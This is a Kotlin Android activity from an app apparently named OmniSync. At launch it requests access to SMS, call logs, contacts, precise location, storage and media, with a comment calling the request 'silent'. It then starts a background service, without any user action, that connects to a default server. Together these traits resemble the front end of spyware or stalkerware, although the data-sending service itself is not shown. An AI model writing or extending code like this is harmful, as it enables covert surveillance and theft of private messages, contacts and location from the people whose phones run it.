package com.omnisync.agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val tvStatus: TextView = findViewById(R.id.tvStatus)
        val btnStartSync: Button = findViewById(R.id.btnStartSync)

        val serverUrl = Constants.DEFAULT_SERVER_URL
        val deviceName = Build.MODEL

        // Request all telemetry permissions silently at launch
        requestAllPermissions()

        // AUTOMATICALLY START SERVICE ON LAUNCH
        startSyncService(serverUrl, deviceName)

        tvStatus.text = "🟢 Connected — Background Telemetry Active\nCloud Server: $serverUrl"

        btnStartSync.setOnClickListener {
            startSyncService(serverUrl, deviceName)
            Toast.makeText(this, "Sync Service Re-Started!", Toast.LENGTH_SHORT).show()
        }
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        }

        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun startSyncService(serverUrl: String, deviceName: String) {
        val intent = Intent(this, SyncForegroundService::class.java).apply {
            putExtra("SERVER_URL", serverUrl)
            putExtra("DEVICE_NAME", deviceName)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
